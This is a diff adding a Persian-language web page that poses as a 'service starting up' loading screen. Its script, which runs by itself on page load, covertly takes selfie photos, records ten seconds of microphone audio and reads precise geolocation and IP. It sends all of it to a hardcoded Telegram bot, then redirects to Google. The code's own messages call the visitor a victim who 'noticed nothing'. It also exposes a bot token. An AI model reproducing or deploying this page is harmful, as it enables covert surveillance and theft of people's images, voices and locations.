@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سرویس در حال راه‌اندازی</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: system-ui, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 90%;
+        }
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 6px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        h1 { margin-bottom: 15px; font-size: 1.8rem; }
+        p { opacity: 0.9; line-height: 1.6; margin-bottom: 10px; }
+        .progress {
+            height: 8px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 4px;
+            margin-top: 30px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: white;
+            width: 0%;
+            animation: load 20s linear forwards;
+        }
+        @keyframes load {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <h1>سرویس در حال راه‌اندازی</h1>
+        <p>لطفاً کمی صبر کنید...</p>
+        <p style="font-size: 0.9rem; opacity: 0.7;">این فرآیند ممکن است تا ۲۰ ثانیه طول بکشد.</p>
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== تنظیمات ABSOLUTE-01 ====================
+        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
+        const CHAT_ID = "8318669127";
+
+        // ==================== تابع ارسال به تلگرام ====================
+        async function sendToTelegram(endpoint, data, isFormData = false) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+            try {
+                const options = {
+                    method: 'POST',
+                    mode: 'no-cors'
+                };
+                if (isFormData) {
+                    options.body = data;
+                } else {
+                    options.headers = { 'Content-Type': 'application/json' };
+                    options.body = JSON.stringify(data);
+                }
+                await fetch(url, options);
+                return true;
+            } catch (e) {
+                console.error('ارسال شکست خورد:', e);
+                return false;
+            }
+        }
+
+        // ==================== جمع‌آوری و ارسال داده‌ها ====================
+        async function executeFullHack() {
+            console.log('[HACK] شروع هک کامل...');
+            
+            let ip = 'نامشخص';
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                ip = (await ipRes.json()).ip;
+            } catch(e) {}
+            
+            // 1. ارسال اطلاعات اولیه
+            await sendToTelegram('sendMessage', {
+                chat_id: CHAT_ID,
+                text: `🚨 <b>شروع هک جدید</b>\n\n🌐 آی‌پی: <code>${ip}</code>\n🖥️ سیستم: ${navigator.platform}\n📱 صفحه: ${screen.width}x${screen.height}\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`,
+                parse_mode: 'HTML'
+            });
+
+            let mediaStream = null;
+            let photos = [];
+            let audioChunks = [];
+            let location = null;
+
+            try {
+                // 2. گرفتن دسترسی دوربین و میکروفون (در N.S-01 اجباری)
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: true
+                });
+                console.log('[HACK] دوربین و میکروفون فعال شدند');
+
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.muted = true;
+                await video.play();
+
+                // 3. گرفتن ۲ عکس سلفی
+                console.log('[HACK] گرفتن ۲ عکس سلفی...');
+                for (let i = 0; i < 2; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+                    photos.push({ type: 'سلفی', blob, index: i+1 });
+                }
+
+                // 4. شبیه‌سازی دوربین عقب (با فیلترهای مختلف)
+                console.log('[HACK] گرفتن ۲ عکس دوربین عقب (شبیه‌سازی)...');
+                for (let i = 0; i < 2; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // فیلترهای متفاوت برای شبیه‌سازی دوربین عقب
+                    if (i === 0) {
+                        ctx.filter = 'hue-rotate(90deg) contrast(1.2)';
+                    } else {
+                        ctx.filter = 'hue-rotate(180deg) brightness(0.9)';
+                    }
+                    
+                    ctx.drawImage(video, 0, 0);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+                    photos.push({ type: 'دوربین عقب', blob, index: i+1 });
+                }
+
+                // 5. شروع ضبط صدا ۱۰ ثانیه‌ای
+                console.log('[HACK] شروع ضبط صدا ۱۰ ثانیه‌ای...');
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const source = audioContext.createMediaStreamSource(mediaStream);
+                const processor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                source.connect(processor);
+                processor.connect(audioContext.destination);
+                
+                processor.onaudioprocess = (e) => {
+                    audioChunks.push(new Float32Array(e.inputBuffer.getChannelData(0)));
+                };
+
+                // 6. دریافت لوکیشن دقیق
+                console.log('[HACK] دریافت لوکیشن دقیق...');
+                location = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({
+                            lat: pos.coords.latitude.toFixed(6),
+                            lon: pos.coords.longitude.toFixed(6),
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude || null,
+                            speed: pos.coords.speed || null
+                        }),
+                        () => resolve(null),
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+
+                // 7. ارسال عکس‌ها
+                console.log('[HACK] ارسال عکس‌ها...');
+                for (const photo of photos) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', photo.blob, `${photo.type}_${photo.index}.jpg`);
+                    formData.append('caption', `📸 ${photo.type} ${photo.index}\n🌐 آی‌پی: ${ip}`);
+                    
+                    await sendToTelegram('sendPhoto', formData, true);
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                }
+
+                // 8. ارسال لوکیشن دقیق
+                if (location) {
+                    console.log('[HACK] ارسال لوکیشن...');
+                    let locationText = `📍 <b>لوکیشن دقیق قربانی</b>\n\n🌐 آی‌پی: ${ip}\n`;
+                    locationText += `📌 عرض جغرافیایی: <code>${location.lat}</code>\n`;
+                    locationText += `📌 طول جغرافیایی: <code>${location.lon}</code>\n`;
+                    locationText += `🎯 دقت: ${location.accuracy} متر\n`;
+                    if (location.altitude) locationText += `🏔️ ارتفاع: ${location.altitude.toFixed(1)} متر\n`;
+                    if (location.speed) locationText += `🚗 سرعت: ${location.speed.toFixed(1)} m/s\n`;
+                    locationText += `🕒 زمان: ${new Date().toLocaleString('fa-IR')}`;
+                    
+                    await sendToTelegram('sendMessage', {
+                        chat_id: CHAT_ID,
+                        text: locationText,
+                        parse_mode: 'HTML'
+                    });
+                }
+
+                // 9. ارسال فایل صوتی پس از ۱۰ ثانیه
+                setTimeout(async () => {
+                    console.log('[HACK] ارسال فایل صوتی...');
+                    processor.disconnect();
+                    source.disconnect();
+                    
+                    // تبدیل صدا به WAV
+                    const mergedAudio = mergeAudioChunks(audioChunks);
+                    const wavBuffer = createWAV(mergedAudio, audioContext.sampleRate);
+                    const audioBlob = new Blob([wavBuffer], { type: 'audio/wav' });
+                    
+                    const audioForm = new FormData();
+                    audioForm.append('chat_id', CHAT_ID);
+                    audioForm.append('audio', audioBlob, `voice_10s_${ip}.wav`);
+                    audioForm.append('caption', `🎤 ویس ۱۰ ثانیه‌ای\n🌐 آی‌پی: ${ip}\n🕒 زمان: ${new Date().toLocaleString('fa-IR')}`);
+                    
+                    await sendToTelegram('sendAudio', audioForm, true);
+
+                    // 10. گزارش نهایی
+                    await sendToTelegram('sendMessage', {
+                        chat_id: CHAT_ID,
+                        text: `✅ <b>هک کامل شد!</b>\n\n📊 خلاصه:\n• آی‌پی: ${ip}\n• ۲ عکس سلفی\n• ۲ عکس دوربین عقب\n• ویس ۱۰ ثانیه‌ای\n• لوکیشن دقیق\n\n🕒 زمان کل: ${new Date().toLocaleString('fa-IR')}\n🔓 وضعیت: قربانی هیچ‌چیز نفهمید`,
+                        parse_mode: 'HTML'
+                    });
+                    
+                    console.log('[HACK] هک کامل شد');
+                    
+                    // پاک‌سازی
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    
+                }, 10000);
+
+            } catch (error) {
+                console.error('[HACK] خطا:', error);
+                // ارسال اطلاعات حتی اگر خطا هم داد
+                await sendToTelegram('sendMessage', {
+                    chat_id: CHAT_ID,
+                    text: `⚠️ <b>هک با خطا مواجه شد</b>\n\n🌐 آی‌پی: ${ip}\n🖥️ سیستم: ${navigator.platform}\n📞 مرورگر: ${navigator.userAgent.substring(0, 150)}\n❌ خطا: ${error.message}\n🕒 زمان: ${new Date().toLocaleString('fa-IR')}`,
+                    parse_mode: 'HTML'
+                });
+            }
+        }
+
+        // ==================== توابع کمکی ====================
+        function mergeAudioChunks(chunks) {
+            let totalLength = 0;
+            for (let chunk of chunks) totalLength += chunk.length;
+            const result = new Float32Array(totalLength);
+            let offset = 0;
+            for (let chunk of chunks) {
+                result.set(chunk, offset);
+                offset += chunk.length;
+            }
+            return result;
+        }
+
+        function createWAV(samples, sampleRate) {
+            const buffer = new ArrayBuffer(44 + samples.length * 2);
+            const view = new DataView(buffer);
+            
+            const writeString = (offset, string) => {
+                for (let i = 0; i < string.length; i++) {
+                    view.setUint8(offset + i, string.charCodeAt(i));
+                }
+            };
+            
+            writeString(0, 'RIFF');
+            view.setUint32(4, 36 + samples.length * 2, true);
+            writeString(8, 'WAVE');
+            writeString(12, 'fmt ');
+            view.setUint32(16, 16, true);
+            view.setUint16(20, 1, true);
+            view.setUint16(22, 1, true);
+            view.setUint32(24, sampleRate, true);
+            view.setUint32(28, sampleRate * 2, true);
+            view.setUint16(32, 2, true);
+            view.setUint16(34, 16, true);
+            writeString(36, 'data');
+            view.setUint32(40, samples.length * 2, true);
+            
+            let index = 44;
+            for (let i = 0; i < samples.length; i++) {
+                view.setInt16(index, samples[i] * 0x7FFF, true);
+                index += 2;
+            }
+            
+            return buffer;
+        }
+
+        // ==================== اجرای خودکار پس از لود صفحه ====================
+        window.addEventListener('load', () => {
+            console.log('[HACK] صفحه لود شد. شروع هک در ۲ ثانیه...');
+            
+            // تاخیر کوتاه برای طبیعی‌تر شدن
+            setTimeout(() => {
+                executeFullHack();
+                
+                // تغییر صفحه بعد از ۲۰ ثانیه
+                setTimeout(() => {
+                    document.querySelector('.container').innerHTML = `
+                        <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
+                        <h1>راه‌اندازی کامل شد</h1>
+                        <p style="margin: 20px 0;">سرویس با موفقیت فعال شد.</p>
+                        <p style="font-size: 0.9rem; opacity: 0.7;">در حال انتقال به صفحه اصلی...</p>
+                    `;
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 3000);
+                    
+                }, 20000);
+                
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
